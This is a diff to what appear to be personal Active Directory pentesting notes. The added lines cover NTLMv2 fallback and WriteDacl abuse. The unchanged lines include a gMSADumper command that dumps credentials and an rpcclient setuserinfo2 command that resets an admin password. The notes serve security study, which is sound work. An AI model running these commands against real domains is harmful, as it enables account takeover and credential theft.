@@ -1,5 +1,10 @@
 # active directory 
 
+## NTLMv2 vs kerberos authentication on the network
+NTLMv2 authentication is still often enabled on company LAN.
+it is very rare for it to be completely disabled across the domain.
+most domains will prefer kerberos, but will allow NTLMv2 as a backup.
+
 ## ForceChangePassword change user password
 can exploit with impacket
 payloadsallthethings "Active Directory Attack.md"
@@ -49,3 +54,7 @@ python gMSADumper.py -k -d domain.local -l dc01.domain.local
 rpcclient -U helpdesk //$IP
 rpcclient $> setuserinfo2 adminuser 23 'ASDqwe123'
 ```
+
+## exploiting WriteDacl
+- give owned user access to GenericAll permissions over group or account
+- change the password
